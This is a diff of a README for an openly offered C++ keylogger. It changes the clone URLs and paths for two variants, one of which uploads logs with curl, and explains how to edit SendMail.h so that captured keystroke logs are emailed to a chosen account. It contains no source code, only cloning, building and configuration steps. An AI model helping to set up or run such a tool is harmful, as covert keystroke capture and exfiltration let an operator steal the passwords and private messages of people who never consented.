@@ -63,40 +63,40 @@ A step by step series of examples that tell you have to get a development enviro
 
 Download the repository using either bash or the browser
 
-- Keylogger With Curl
+- Keylogger With Curl :
 
 ```
-git clone https://github.com/htmercury/Cpp-Keylogger
-```
-
-Open the solution file in Visual Studio using the sln file
-
-```
-located at ..\Cpp-Keylogger\Keylogger.sln
-```
-
-For other IDEs, make a project that includes all source and header files
-
-```
-located at ..\Cpp-Keylogger\Keylogger
-```
-
-- Keylogger
-
-```
-git clone https://github.com/htmercury/Cpp-Keylogger
+git clone https://github.com/walidAbbassi/Keylogger-cpp/tree/master/KeyloggerWithCurl
 ```
 
 Open the solution file in Visual Studio using the sln file
 
 ```
-located at ..\Cpp-Keylogger\Keylogger.sln
+located at ..\KeyloggerWithCurl\Keylogger.sln
 ```
 
 For other IDEs, make a project that includes all source and header files
 
 ```
-located at ..\Cpp-Keylogger\Keylogger
+located at ..\KeyloggerWithCurl\Keylogger
+```
+
+- Keylogger :
+
+```
+git clone https://github.com/walidAbbassi/Keylogger-cpp/tree/master/Keylogger
+```
+
+Open the solution file in Visual Studio using the sln file
+
+```
+located at ..\Keylogger\Keylogger.sln
+```
+
+For other IDEs, make a project that includes all source and header files
+
+```
+located at ..\Keylogger\Keylogger
 ```
 
 ## Setting it up
@@ -107,7 +107,7 @@ Required if user wants the log to be sent to an email.
 
 Open SendMail.h
 ```
-located at ..\Cpp-Keylogger\Keylogger\SendMail.h
+located at ..\Keylogger\Keylogger\SendMail.h
 ```
 Edit line 16 for where the log should be sent from (default: gmail only, look at Other Emails section for changing that)
 ```
@@ -133,7 +133,7 @@ OPTIONAL: If you want to use another email other than gmail as the source email,
 
 Open SendMail.h
 ```
-located at ..\Cpp-Keylogger\Keylogger\SendMail.h
+located at ..\Keylogger\Keylogger\SendMail.h
 ```
 Edit line 39 with your email port number which can be searched up
 ```
